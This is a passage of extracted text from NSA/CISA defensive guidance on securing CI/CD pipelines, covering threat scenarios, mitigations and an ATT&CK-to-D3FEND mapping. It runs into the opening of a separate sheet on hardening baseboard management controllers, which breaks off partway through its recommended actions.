compromise, an MCA injects malicious code or commands into the build pipeline
configuration, poisoning the pipeline to run malicious code during the build process. [3]
Insufficient pipeline access controls
An MCA might abuse the lack of access control permissions to pivot in a CI/CD pipeline,
which could allow them to inject malicious code into an application. CI/CD pipelinebased access controls (PBAC) grant or deny access to resources and systems inside
and outside the execution environment. Pipeline execution nodes use these resources
to perform various actions. See OWASP CICD-Sec-5: Insufficient PBAC for more detail.
Insecure system configuration
An MCA can exploit system misconfigurations in a CI/CD environment. A CI/CD system
may contain various infrastructure, network, and application configurations. These
configurations impact the security posture of the CI/CD pipeline and its susceptibility to
exploitation. See OWASP CICD-Sec-7: Insecure System Configuration for more detail.
Usage of third-party services
Third-party services are often utilized in CI/CD pipelines. This integration facilitates
rapid development and delivery. An MCA can take advantage of the improper usage of
third-party services to introduce security weaknesses into the pipeline. Examples of
third-party services are GitLab, GitHub, and Travis CI.
U/OO/170159-23 | PP-23-1680 | JUN 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA, CISA | Defending Continuous Integration/Continuous Delivery (CI/CD) Environments
Exposure of secrets
MCAs have exploited CI/CD pipelines by using exposed secrets to gain initial access.
Secrets (e.g., private keys and passwords) are required for authentication between tools
and in the build and deployment process to ensure deployed resources have access.
Cloud native CI/CD tools employ numerous secrets to gain access to many sensitive
resources, such as databases and codebases.
Threat scenarios
The following are three potential threat scenarios to consider and their corresponding
mitigations. These scenarios are not all-inclusive, so consider other threat scenarios as
well that are relevant to a particular CI/CD environment based on its attack surface.
Scenario 1: MCAs acquire a developer
s credential to access a Git repository
service (e.g., stolen personal token, SSH key, browser cookie, or login
password). Typically, an MCA will go after 1) valid accounts for a source code
repository, 2) valid accounts for a CI/CD Service, or 3) valid admin account of a
server hosting a source code repository.
 Recommended mitigations:
 Minimize the use of long-term credentials.
 Utilize two-person rules (2PR) for all code updates.
 Secure user accounts.
 Implement least-privilege policies for CI/CD access.
 Implement network segmentation and traffic filtering [CPG 2.F].
Scenario 2: Supply chain compromise of an application library, tool, or container
image in a CI/CD pipeline that leads to a poisoned DevSecOps environment.
 Recommended mitigations:
 Restrict untrusted libraries and tools.
 Analyze committed code.
 Implement endpoint detection and response (EDR) tools and
auditing.
 Keep CI/CD tools up-to-date.
 Maintain up-to-date software and operating systems.
Scenario 3: Supply chain compromise of a CI/CD environment that 1) modifies
the CI/CD configuration, 2) injects code into the IaC configuration, 3) injects code
into the source code, or 4) injects a malicious or vulnerable dependency.
 Recommended mitigations:
U/OO/170159-23 | PP-23-1680 | JUN 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA, CISA | Defending Continuous Integration/Continuous Delivery (CI/CD) Environments
Analyze committed code.
Integrate security scanning as part of the CI/CD pipeline.
Keep audit logs.
Implement EDR tools.
Add signature to CI/CD configuration and verify it.
Implement software bill of materials (SBOM) and software
composition analysis (SCA).
The following figure illustrates different attack vectors using the example of a CI/CD
pipeline hosted in Amazon Web Services (AWS) and using common AWS services.
Similarly, these attack vectors apply to other CI/CD pipelines generally, whether hosted
in the cloud or on-premises.
Figure 2: Different attack vectors in an AWS CI/CD pipeline
Active hardening
NSA and CISA recommend organizations implement the following mitigations to help
secure CI/CD environments. A zero trust approach, where no user, endpoint device, or
process is fully trusted, will help detect and prevent successful compromise of the
environment. [4] Organizational transition to zero trust can be aided by referencing
CISA
s Zero Trust Security Maturity Model and NSA
s Advancing Zero Trust Maturity
Throughout the User Pillar.
U/OO/170159-23 | PP-23-1680 | JUN 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA, CISA | Defending Continuous Integration/Continuous Delivery (CI/CD) Environments
Authentication and access mitigations
Use NSA-recommended cryptography
NSA and CISA recommend the implementation and configuration of strong
cryptographic algorithms when configuring cloud applications and services. Proper
implementation and configuration of these algorithms augments the protection of data,
secrets, application programming interfaces (APIs), and keys generated across the
CI/CD pipeline. The utilization of weak and outdated cryptographic algorithms poses a
threat to CI/CD pipelines, which may result in sensitive data exposure, data leakage,
broken authentication, and insecure sessions
violations that MCAs could exploit to
circumvent the CI/CD pipeline and software supply chain.
National Security Systems (NSS) are required to use the algorithms in the NSAapproved Commercial National Security Algorithm (CNSA) Suite (see Annex B of
Committee on National Security Systems Policy (CNSSP) 15).
Non-NSS U.S. Government systems are required to use the algorithms as specified by
the National Institute of Standards and Technology (NIST), which includes the
algorithms approved to protect NSS. NSA and CISA recommend using the
cryptographic implementations that have undergone testing, such as Federal
Information Processing Standards (FIPS) validation [CPG 2.K].
Minimize the use of long-term credentials
Use strong credentials that are resistant to stealing, phishing, guessing, and replaying
wherever and whenever possible. For human authentication, always use identity
federation and phishing-resistant security tokens to obtain temporary SSH and other
keys. For software-to-software authentication, avoid using software-based long-term
credentials as much as possible.
In cloud environments, take advantage of cloud-provided temporary and ephemeral
credentials that are available for compute services. For non-cloud environments, where
long-term credentials sometimes must be used (e.g., boot-strapping authentication
based on public keys in x509 certificates), carefully manage and protect all associated
private keys.
Add signature to CI/CD configuration and verify it
NSA and CISA recommend implementing secure code signing to establish digital trust
within the CI/CD pipeline. Ensure code is continuously and properly signed and that the
U/OO/170159-23 | PP-23-1680 | JUN 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA, CISA | Defending Continuous Integration/Continuous Delivery (CI/CD) Environments
signature is verified throughout the CI/CD process, regardless of the stage of
development. If the signature does not validate, investigate the cause of the validation
issue. It could be a minor configuration problem or a sign of a larger breach.
Code signing establishes the authenticity of new releases. If a code signing identity
itself is compromised, it undermines trust. NIST
s Security Considerations for Code
Signing describes the concept of digitally signing code for data integrity and source
authentication. It also explains features and architectural relationships of typical code
signing solutions that are widely deployed today to support various use cases.
Utilize two-person rules (2PR) for all code updates
No single developer should be able to check in code without another developer
reviewing and approving the changes. This practice not only increases code quality
generally, it also means that the compromise of a single developer
s credentials is much
less likely to result in malicious code being successfully checked in.
Implement least-privilege policies for CI/CD access
The CI/CD pipeline should not be accessible by everyone in the organization. If
personnel request access, they should not automatically receive access to all pipelines,
but only limited access with certain privileges [CPG 2.E]. Developers should only have
access to the pipelines they are tasking and the components they are updating.
Separation of duties should be implemented. For example, developers checking in
source code do not need the privilege for updating the build environment, and engineers
in charge of builds do not need read-write source code access. For more detail on
implementing security controls, see NIST SP 800-53.1 Use well-authenticated,
concurrent versioning systems and keep long histories of changes tagged to specific
users.
Mitigate password risks by implementing multi-factor authentication (MFA). Enforce
MFA for users within and outside the organization and complement it with role-based
access control (RBAC), following the principle of the least privilege [CPG 2.H]. [5]
1 NIST 800-53 rv5 Control NIST IDs that aligns to implementing security controls AC-2 (1), AC-2 (2), AC-2 (4), AC-2 (9), AC-2 (10), AC-03 (07), SC-07 (05), AC-
17(2), SC-7, SC-8(1), AC-5, AC-6, AC-6 (1), AC-6 (2), AC-6 (3), AC-6 (4), AC-6 (5), AC-6 (9), AC-6 (10), and SC-23
U/OO/170159-23 | PP-23-1680 | JUN 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA, CISA | Defending Continuous Integration/Continuous Delivery (CI/CD) Environments
Secure user accounts
Regularly audit administrative user accounts and configure access controls under the
principles of least privilege and separation of duties. Audit logs to ensure new accounts
are legitimate [CPG 2.E]. [6]
Secure secrets
Secure handling of secrets, tokens, and other credentials is crucial in a CI/CD pipeline.
Never pass secrets in plaintext anywhere in the pipeline. Ensure secrets (e.g.,
passwords and private keys) are never left embedded in software where they can be
reverse-engineered out. [7] Most modern CI/CD tools come with a secrets management
solution, which means a CI/CD tool can securely store the secrets and pass them using
an indirect reference within the pipeline [CPG 2.L]. [8]
Implement network segmentation and traffic filtering
Implement and ensure robust network segmentation between networks and functions to
reduce the spread of malware and limit access from other parts of the network that do
not need access. Define a demilitarized zone that eliminates unregulated
communication between networks. Filter network traffic to prohibit ingress and egress
communications with known malicious IP addresses [CPG 2.F].
Development environment mitigations
Maintain up-to-date software and operating systems
NSA and CISA recommend upgrading operating systems and software on all devices,
including development systems and all CI/CD assets, to the latest stable versions
supplied by the vendors. Upgrading the operating system may require additional
hardware or memory upgrades, and obtaining a new software version may require a
maintenance or support contract with the vendor. Consider using a centralized patch
management system that includes a software integrity and validation process, ensuring
that the software has not been maliciously altered in transit. For a list of centralized
patch management system examples, visit Info-Tech Research Group
s reviews on
patch management.
Maintaining up-to-date operating systems and software protects against critical
vulnerabilities and security issues that have been identified and fixed in newer releases.
Devices running outdated operating systems or vulnerable software are susceptible to a
U/OO/170159-23 | PP-23-1680 | JUN 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA, CISA | Defending Continuous Integration/Continuous Delivery (CI/CD) Environments
variety of known vulnerabilities, and exploiting these devices is a common technique
used by MCAs to compromise a network [CPG 1.E].
Scan for vulnerabilities and keep software updated. Ensure antivirus/antimalware
programs are updated with current signatures and set to conduct regular scans of
network assets [CPG 1.E].
Keep CI/CD tools up-to-date
Update the CI/CD tools on a regular schedule. Like other software programs, CI/CD
tools may contain bugs and vulnerabilities. Failure to update CI/CD tools leaves the
pipeline vulnerable and allows an MCA to more easily exploit known vulnerabilities
[CPG 1.E].
Remove unnecessary applications
Remove any application not deemed necessary for day-to-day operations.
Implement endpoint detection and response (EDR) tools
EDR tools provide a high degree of visibility into the security status of endpoints and
can help effectively protect against MCAs.
Development process mitigations
Integrate security scanning as part of the CI/CD pipeline
Include security scanning early in the CI/CD process. The following tools should be
employed to detect security flaws in CI/CD pipelines: [9]
Static application security testing (SAST): Include a static code analysis tool
in the build stage to check the code for common security vulnerabilities and
compliance issues.
Registry scanning: Scan every image pulled into the pipeline.
Dynamic analysis security testing (DAST): Deploy an instance of the newly
built application to a testing environment and run tests against the application.
No automated security scanning tool is perfect, so it is important to manually review the
code and the CI/CD pipeline. By understanding how the pipeline works and what could
go wrong, the team can ensure that the pipeline is as secure as possible.
U/OO/170159-23 | PP-23-1680 | JUN 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA, CISA | Defending Continuous Integration/Continuous Delivery (CI/CD) Environments
Restrict untrusted libraries and tools
Only use software, tools, libraries, and artifacts from secure and trusted sources.
Employing software from a trusted source helps minimize the threats posed to the
CI/CD pipeline and prevent potential exploitation (i.e., code execution and backdoors)
by MCAs. Adopting a 
never trust/always verify
 approach toward software reduces
overall CI/CD attack surface.
Analyze committed code
Securing the CI/CD pipeline involves analyzing the code that is being committed, which
can be achieved manually or by using automated tools. Automated tools can identify
potential security vulnerabilities in the code and track changes over time. Analyzing the
code ensures that only approved changes are made to the code base and that any
potential security vulnerabilities are addressed before they can be exploited. [10], [11]
Remove any temporary resources
A CI/CD pipeline may also create temporary resources, such as virtual machines or
Kubernetes clusters, to run tests. While test environments are usually always live, these
temporary resources are meant to be created for a single test purpose and must be
destroyed after the pipeline run. Failure to destroy these allocations can provide
additional attack vectors to the system that can pose a security threat, placing the
CI/CD pipeline at risk.
Keep audit logs
An audit log should provide clear information on who committed, reviewed, and
deployed what, when, and where. If all previous measures fail, an audit log will at least
help forensically reconstruct an incident post-compromise, so it can be quickly
addressed [CPG 2.T, 2.U].
Implement software bill of materials (SBOM) and software composition analysis
(SCA)
An SBOM and SCA can play a useful role in the software development lifecycle (SDLC)
and in DevSecOps by helping to track all third-party and open source components in the
codebase. A vulnerability management team will need to evaluate correlations of SBOM
data to known common vulnerabilities and exposures (CVEs) [CPG 1.E]. SBOM should
reflect vulnerabilities as they are found. It is recommended that SBOM results be
ingested into a security information and event management (SIEM) solution,
immediately making the data searchable to identify security vulnerabilities across a fleet
U/OO/170159-23 | PP-23-1680 | JUN 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA, CISA | Defending Continuous Integration/Continuous Delivery (CI/CD) Environments
of products. This information can also be converted into a human-readable, tabular
format for other data analysis systems. Once an SBOM is available for a given piece of
software, it needs to be mapped onto a list of known vulnerabilities to identify the
components that could pose a threat. NSA and CISA recommend connecting these two
sources of information. See the National Telecommunications and Information
Administration
s Minimum Elements for an SBOM and CISA's SBOM pages for further
reference. Beware, however, that malicious actors can manipulate the content of
SBOMs as well as other artifacts in the pipeline, so SBOMs cannot be presumed
accurate.
Plan, build, and test for resiliency
Build the pipeline for high availability, and test for disaster recovery periodically.
Consider availability (in addition to confidentiality and integrity) threats to the pipeline
during its threat modeling.
Ensure the CI/CD pipeline can elastically scale so that new artifacts can be built and
deployed across all the compute instances quickly, as was necessary to address
Log4Shell exposure in many environments. Consider including coverage for emergency
patch updates in service level agreements (SLA).
Conclusion
The CI/CD pipeline is a distinct and separate attack surface from other segments of the
software supply chain. MCAs can multiply impacts severalfold by exploiting the source
of software deployed to multiple operational environments. By exploiting a CI/CD
environment, MCAs can gain an entryway into corporate networks and access sensitive
data and services.
As a subcomponent of DevSecOps, defending the CI/CD pipeline requires focused and
intentional effort. Keep MCAs out by the following recommended guidance to secure
and harden the CI/CD attack surface. This is essential for ensuring a strong
cybersecurity posture for National Security Systems (NSSs); the Department of Defense
(DoD); the Defense Industrial Base (DIB); federal, state, local, tribal, and territorial
(SLTT) governments; and private sector information system owners.
U/OO/170159-23 | PP-23-1680 | JUN 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA, CISA | Defending Continuous Integration/Continuous Delivery (CI/CD) Environments
Further guidance
Supplementary NSA guidance on ensuring a secure and defensible network
environment is available at www.nsa.gov/cybersecurity-guidance. Of particular
relevance are:
s Top Ten Cybersecurity Mitigation Strategies
Defend Privileges and Accounts
Continuously Hunt for Network Intrusions
Segment Networks and Deploy Application-aware Defenses
Transition to Multi-factor Authentication
Actively Manage Systems and Configurations
Performing Out-of-Band Network Management
Hardening SIEM Solutions
Mitigating Cloud Vulnerabilities
Securing the Software Supply Chain for Developers
Securing the Software Supply Chain: Recommended Practices Guide for
Suppliers
Additional CISA guidance includes:
Multifactor Authentication
Implementing Phishing Resistant MFA
CISA Releases Cloud Security Technical Reference Architecture
CISA Releases SCuBA Hybrid Identity Solutions Architecture Guidance
Document for Public Comment
ESF Identity Hardening Guidance
Works cited
Pittet S. (2021), 
Continuous integration vs. continuous delivery vs. continuous deployment.
https://www.atlassian.com/continuous-delivery/principles/continuous-integration-vs-delivery-vsdeployment
National Institute of Standards and Technology March (2022), 
Special Publication 800-204C:
Implementation of DecSecOPs for a Microservices-based Application with Service Mesh.
https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-204C.pdf
OWASP Foundation (2023), 
OWASP Top 10 CI/CD Security Risks.
 https://owasp.org/wwwproject-top-10-ci-cd-security-risks/
National Institute of Standards and Technology (2020), 
Special Publication 800-207: Zero
Trust Architecture.
 https://csrc.nist.gov/publications/detail/sp/800-207/final
U/OO/170159-23 | PP-23-1680 | JUN 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA, CISA | Defending Continuous Integration/Continuous Delivery (CI/CD) Environments
National Institute of Standards and Technology (2020), 
Special Publication 800-53: Security
and Privacy Controls for Information Systems and Organizations.
https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r5.pdf
Department of Defense (2020), 
Identity, Credential, and Access Management (ICAM)
Strategy.
 https://dodcio.defense.gov/Portals/0/Documents/Cyber/ICAM_Strategy.pdf
Hill M. (2023), 
Hard-coded secrets are up 67% as secrets sprawl threatens software supply
chain.
 https://www.csoonline.com/article/3689892/hard-coded-secrets-up-67-as-secretssprawl-threatens-software-supply-chain.html
National Institute of Standards and Technology (2022), 
Key Management Guidelines.
https://csrc.nist.gov/projects/key-management/key-management-guidelines
National Institute of Standards and Technology (2022), 
Special Publication 800-218: Secure
Development Framework (SSDF) Version 1.1: Recommendation for Mitigating the Risk of
Software Vulnerabilities.
 https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800218.pdf
Department of Defense (2021), 
DevSecOps Playbook.
https://dodcio.defense.gov/Portals/0/Documents/Library/DevSecOps%20Playbook_DoDCIO_20211019.pdf
Department of Defense (2019), 
DoD Enterprise DevSecOps Reference Design.
https://dodcio.defense.gov/Portals/0/Documents/DoD%20Enterprise%20DevSecOps%20Refer
ence%20Design%20v1.0_Public%20Release.pdf
[10]
[11]
Disclaimer of endorsement
The information and opinions contained in this document are provided 
as is
 and without any warranties or
guarantees. Reference herein to any specific commercial products, process, or service by trade name, trademark,
manufacturer, or otherwise, does not constitute or imply its endorsement, recommendation, or favoring by the United
States Government, and this guidance shall not be used for advertising or product endorsement purposes.
Purpose
This document was developed in furtherance of the authoring cybersecurity authorities
 cybersecurity missions,
including their responsibilities to identify and disseminate threats to information systems, and to develop and issue
cybersecurity specifications and mitigations. This information may be shared broadly to reach all appropriate
stakeholders.
Contact
Cybersecurity Report Feedback: CybersecurityReports@nsa.gov
General Cybersecurity Inquiries: Cybersecurity_Requests@nsa.gov
Defense Industrial Base Inquiries and Cybersecurity Services: DIB_Defense@cyber.nsa.gov
CISA
s 24/7 Operations Center to report incidents and anomalous activity: Report@cisa.gov or (888) 282-0870
Media Inquiries / Press Desk:
NSA Media Relations: 443-634-0721, MediaRelations@nsa.gov
CISA Media Relations: 703-235-2010, CISAMedia@cisa.dhs.gov
U/OO/170159-23 | PP-23-1680 | JUN 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA, CISA | Defending Continuous Integration/Continuous Delivery (CI/CD) Environments
Appendix A: CI/CD threats mapped to MITRE ATT&CK
The first step to securing a CI/CD pipeline is determining the threats and vulnerabilities
within the build and deployment process that require additional security. Threat
modeling can help map threats to the pipeline. Additionally, inventory all CI/CD
connections and treat them as potential points of compromise. The MITRE ATT&CK for
Enterprise framework is a globally accessible knowledge base of adversary tactics and
techniques based on real-world observations.
MITRE
s D3FEND provides a one-stop shop for understanding defensive cyber
techniques and demonstrates the power of collaboration across the public and private
sectors in countering malicious cyber activity.
The following figure and tables list the ATT&CK techniques an MCA may use to exploit
CI/CD pipelines, as well as the D3FEND mitigations to counter these malicious
activities.
Figure 3: CI/CD attack vectors mapped to ATT&CK techniques and D3FEND countermeasures
Initial Access
From the perspective of a cybersecurity practitioner, begin by following the standard
MITRE ATT&CK Matrix definition for Initial Access. Initial Access consists of techniques
that MCAs use to gain an initial foothold within a network. For Initial Access, an MCA
U/OO/170159-23 | PP-23-1680 | JUN 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA, CISA | Defending Continuous Integration/Continuous Delivery (CI/CD) Environments
may employ the following ATT&CK Tactics and Techniques/Sub-Techniques to exploit a
DevSecOps CI/CD cloud environment:
ATT&CK Tactic
Technique
Initial Access
Supply Chain Compromise [T1195]
Initial Access
Compromise Software Supply Chain [T1195.002]
Initial Access
Valid Accounts [T1078]
D3FEND enumerates the following mitigations to counter these techniques:
D3FEND Tactic
Countermeasure
Application Hardening
Application Configuration Hardening [D3-ACH]
User Behavior Analysis
Local Account Monitoring [D3-LAM]
Execution
Execution consists of techniques that result in adversary-controlled code running on a
blue space system. Techniques that run malicious code are often paired with
techniques from any other tactics to achieve broader goals, such as exploring a network
or stealing data. For Execution, an MCA may employ the following ATT&CK Tactic,
Techniques/Sub-Techniques to exploit a DevSecOps CI/CD cloud environment:
ATT&CK Tactic
Technique
Execution
Container Administration Command [T1609]
Execution
Command and Scripting Interpreter [T1059]
D3FEND enumerates the following mitigations to counter these techniques:
D3FEND Tactic
Countermeasure
Application Hardening
Application Configuration Hardening [D3-ACH]
Execution Isolation
Executable Allow Listing [D3-EAL]
Persistence
Persistence consists of techniques that adversaries use to keep access to systems
across restarts, changed credentials, and other interruptions that could cut off their
access. Techniques used for Persistence include any access, action, or configuration
changes that let them maintain their foothold on systems, such as replacing or hijacking
legitimate code or adding startup code. For Persistence, an MCA may employ the
U/OO/170159-23 | PP-23-1680 | JUN 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA, CISA | Defending Continuous Integration/Continuous Delivery (CI/CD) Environments
following ATT&CK Tactic, Techniques/Sub-Techniques to exploit a DevSecOps CI/CD
cloud environment:
ATT&CK Tactic
Technique
Persistence
Create Account [T1136]
Persistence
Account Manipulation [T1098]
Persistence
Additional Cloud Credentials [T1098.001]
Persistence
Additional Email Delegate Permissions
[T1098.002]
Persistence
Additional Cloud Roles [T1098.003]
Persistence
SSH Authorized Keys [T1098.004]
Persistence, Privilege Escalation
Create or Modify System Process [T1543]
Persistence, Privilege Escalation
Event Triggered Execution [T1546]
Persistence
Implant Internal Image [T1525]
D3FEND enumerates the following mitigations to counter these techniques:
D3FEND Tactic
Countermeasure
Platform Monitoring
Endpoint Health Beacon [D3-EHB]
User Behavior Analysis
Local Account Monitoring [D3-LAM]
Privilege Escalation
Privilege Escalation consists of techniques that adversaries use to gain higher-level
permissions on a system or network. Adversaries can often enter and explore a network
with unprivileged access but require elevated permissions to follow through on their
objectives. Common approaches are to take advantage of system weaknesses,
misconfigurations, and vulnerabilities. For Privilege Escalation, an MCA may employ the
following ATT&CK Tactic, Techniques/Sub-Techniques to exploit a DevSecOps CI/CD
cloud environment:
ATT&CK Tactic
Technique
Privilege Escalation
Cloud Accounts [T1078.004]
D3FEND enumerates the following mitigations to counter these techniques:
D3FEND Tactic
Countermeasure
Platform Monitoring
Endpoint Health Beacon [D3-EHB]
U/OO/170159-23 | PP-23-1680 | JUN 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA, CISA | Defending Continuous Integration/Continuous Delivery (CI/CD) Environments
Defense Evasion
Defense Evasion consists of techniques that adversaries use to avoid detection
throughout their compromise. Techniques used for Defense Evasion include
uninstalling/disabling security software or obfuscating/encrypting data and scripts.
Adversaries also leverage and abuse trusted processes to hide and masquerade their
malware. For Defense Evasion, an MCA may employ the following ATT&CK Tactic,
Techniques/Sub-Techniques to exploit a DevSecOps CI/CD cloud environment:
ATT&CK Tactic
Technique
Defense Evasion, Persistence,
Privilege Escalation, Initial Access
Cloud Accounts [T1078.004]
Defense Evasion
Exploitation for Defense Evasion [T1211]
Collection
Data from Cloud Storage [T1530]
Persistence
Implant Internal Image [T1525]
Credential Access, Collection
Adversary-in-the-Middle [T1557]
Execution
Container Administration Command [T1609]
Defense Evasion, Execution
Deploy Container [T1610]
Privilege Escalation
Escape to Host [T1611]
Discovery
Container and Resource Discovery [T1613]
Defense Evasion, Lateral
Movement
Use Alternate Authentication Material [T1550]
Defense Evasion
Impair Defenses [T1562]
D3FEND enumerates the following mitigations to counter these techniques:
D3FEND Tactic
Countermeasure
Platform Monitoring
Endpoint Health Beacon [D3-EHB]
Credential Access
Credential Access consists of techniques for stealing credentials, such as account
names and passwords. Techniques used to get credentials include keylogging or
credential dumping. Using legitimate credentials can give adversaries access to
systems, make adversaries harder to detect, and provide adversaries with the
opportunity to create more accounts to help achieve their goals. For Credential Access,
U/OO/170159-23 | PP-23-1680 | JUN 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA, CISA | Defending Continuous Integration/Continuous Delivery (CI/CD) Environments
an MCA may employ the following ATT&CK Tactic, Techniques/Sub-Techniques to
exploit a DevSecOps CI/CD cloud environment:
ATT&CK Tactic
Technique
Credential Access
Multi-Factor Authentication Interception [T1111]
Credential Access
Exploitation for Credential Access [T1212]
Credential Access
Steal Application Access Token [T1528]
Credential Access
SAML Tokens [T1606.002]
Credential Access
Private Keys [T1552.004]
Credential Access, Defense
Evasion, Persistence
Modify Authentication Process [T1556]
D3FEND enumerates the following mitigations to counter these techniques:
D3FEND Tactic
Countermeasure
Application Hardening
Application Configuration Hardening [D3-ACH]
Credential Hardening
Multi-Factor Authentication [D3-MFA]
Credential Hardening
One-time Password [D3-OTP]
Harden
Credential Hardening [D3-CH]
Credential Hardening
User Account Permissions [D3-UAP]
Lateral Movement
Lateral Movement consists of techniques that adversaries use to exploit and control
remote systems on a network. Achieving their primary objective often requires exploring
the network to find their target and subsequently gaining access to it. Reaching their
objective often involves pivoting through multiple systems and accounts. For Lateral
Movement, an MCA may employ the following ATT&CK Tactic, Techniques/SubTechniques to exploit a DevSecOps CI/CD cloud environment:
ATT&CK Tactic
Technique
Execution
Command and Scripting Interpreter [T1059]
Privilege Escalation
Exploitation for Privilege Escalation [T1068]
Persistence
Account Manipulation [T1098]
Defense Evasion, Persistence,
Privilege Escalation, Initial Access
Valid Accounts [T1078]
D3FEND enumerates the following mitigations to counter these techniques:
U/OO/170159-23 | PP-23-1680 | JUN 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA, CISA | Defending Continuous Integration/Continuous Delivery (CI/CD) Environments
D3FEND Tactic
Countermeasure
Platform Monitoring
Endpoint Health Beacon [D3-EHB]
Exfiltration
Exfiltration consists of techniques that adversaries may use to steal data from the
network. Once they have collected data, adversaries often package it to avoid detection
while moving it back to their own systems. This can include compression and
encryption. For Exfiltration, an MCA may employ the following ATT&CK Tactic,
Techniques/Sub-Techniques to exploit a DevSecOps CI/CD cloud environment:
ATT&CK Tactic
Technique
Persistence
Create Account [T1136]
Exfiltration
Automated Exfiltration [T1020]
Exfiltration
Exfiltration Over C2 Channel [T1041]
Exfiltration
Exfiltration Over Alternative Protocol [T1048]
Exfiltration
Transfer Data to Cloud Account [T1537]
D3FEND enumerates the following mitigations to counter these techniques:
D3FEND Tactic
Platform Monitoring
U/OO/170159-23 | PP-23-1680 | JUN 2023 Ver. 1.0
Countermeasure
Endpoint Health Beacon [D3-EHB]
TLP:CLEAR
TLP:CLEAR
National
Secrity
Agency
Cybersecurity and
Infrastructure
Security Agency
| Cybersecurity Information
Harden Baseboard Management Controllers
Summary
Baseboard management controllers (BMCs) are trusted components designed into a computer
hardware that operate separately from the operating system and firmware to allow for remote
management and control, even when the system is shut down. This Cybersecurity Information
Sheet (CSI), authored by the National Security Agency (NSA) and the Cybersecurity and
Infrastructure Security Agency (CISA), highlights threats to BMCs and details actions
organizations can use to harden them. NSA and CISA encourage all organizations managing
relevant servers to apply the recommended actions in this CSI.
Malicious actors target overlooked firmware
A BMC differs from the basic input output system (BIOS) and the Unified Extensible Firmware
Interface (UEFI), which have a later role in booting a computer, and management engine (ME),
which has different remote management functionality. BMC firmware is highly privileged,
executes outside the scope of operating system (OS) controls, and has access to all resources
of the server-class platform on which it resides. It executes the moment power is applied to the
server. Therefore, boot to a hypervisor or OS is not necessary as the BMC functions even if the
server is shutdown.
Most BMCs provide network-accessible configuration and management, and BMC management
solutions administer large numbers of servers without requiring a physical touch. They take the
form of a dedicated circuit chip with discrete firmware that must be maintained separately from
automated or OS-hosted patching solutions. Most BMCs do not provide integration with user
account management solutions. Administrators must perform updates and all administrative
actions affecting BMCs via commands delivered over network connections.
Many organizations fail to take the minimum action to secure and maintain BMCs. Hardened
credentials, firmware updates, and network segmentation options are frequently overlooked,
leading to a vulnerable BMC. A vulnerable BMC broadens the attack vector by providing
malicious actors the opportunity to employ tactics such as establishing a beachhead with preboot execution potential. [1] Additionally, a malicious actor could disable security solutions such
as the trusted platform module (TPM) or UEFI secure boot, manipulate data on any attached
storage media, or propagate implants or disruptive instructions across a network infrastructure.
Traditional tools and security features including endpoint detection and response (EDR)
software, intrusion detection/prevention systems (IDS/IPS), anti-malware suites, kernel security
This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information carries minimal or
no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright
rules, TLP:CLEAR information may be distributed without restriction. For more information on the Traffic Light Protocol, see
cisa.gov/tlp.
U/OO/164464-23 | PP-23-1426 | JUN 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA, CISA | Harden Baseboard Management Controllers
enhancements, virtualization capabilities, and TPM attestation are ineffective at mitigating a
compromised BMC. For these reasons, NSA and CISA recommend organizations pay attention
to the security of their BMCs and apply the hardening actions detailed in the following section.
Recommended actions
These recommended actions align with the cross-sector cybersecurity performance goals
(CPGs) CISA and the National Institute of Standards and Technology (NIST) developed. The
CPGs provide a minimum set of practices and protections that CISA and NIST recommend all
organizations implement. Visit CISA
s Cross-Sector Cybersecurity Performance Goals for more
information on the CPGs, including additional recommended baseline protections.
1. Protect BMC credentials
Change the default BMC credentials as soon as possible. Establish unique user accounts for
administrators, if supported. Always use strong passwords compliant with NIST guidelines such
as SP 800-63B. [2] Do not expose default credentials to an internet connection or untrusted
segment of an enclave [CPG 2.A, 2.B, 2.C, 2.E, 2.L].
2. Enforce VLAN separation
Establish a virtual local area network (VLAN) to isolate BMC network connections since many
BMC products have a dedicated network port not shared with the OS or virtual machine
manager (VMM). Limit the endpoints that may communicate with BMCs in the enterprise
infrastructure
commonly referred to as an Administrative VLAN. Limit or block BMC access to
the internet. If the BMC requires internet access to update, create rules such that only updatesupporting traffic is permitted during the update download [CPG 2.F, 2.X].
3. Harden configurations
Consult vendor guides and recommendations for hardening BMCs against unauthorized access
and persistent threats. UEFI hardening configuration guidance may apply to many BMC settings
[CPG 1.E, 2.V, 2.W, 2.X]. [3]
4. Perform routine BMC update checks
BMC updates are delivered separately from most other software and firmware updates.
Establish a routine to conduct monthly or quarterly checks for BMC updates according to the
system vendor
s recommendations and scheduled patch releases. Combine BMC update
installations with routine server maintenance and scheduled downtime when possible. Note that
some servers require a restart after BMC updates, while some can restart the BMC independent
U/OO/164464-23 | PP-23-1426 | JUN 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA, CISA | Harden Baseboard Management Controllers
of the OS or VMM. BMC updates may be provided via the internet, a local executable, an image
stored on removable media, or network file storage [CPG 1.E].
Remember: OS patch maintenance solutions do not deliver BMC updates.
5. Monitor BMC integrity
Some BMCs report integrity data to a root of trust (RoT). The RoT could take the form of a TPM,
dedicated security chip or coprocessor (multiple trademarked names in use), or a central
processing unit (CPU) secure memory enclave. Monitor integrity features for unexpected
changes and platform alerts [CPG 2.T].
6. Move sensitive workloads to hardened devices
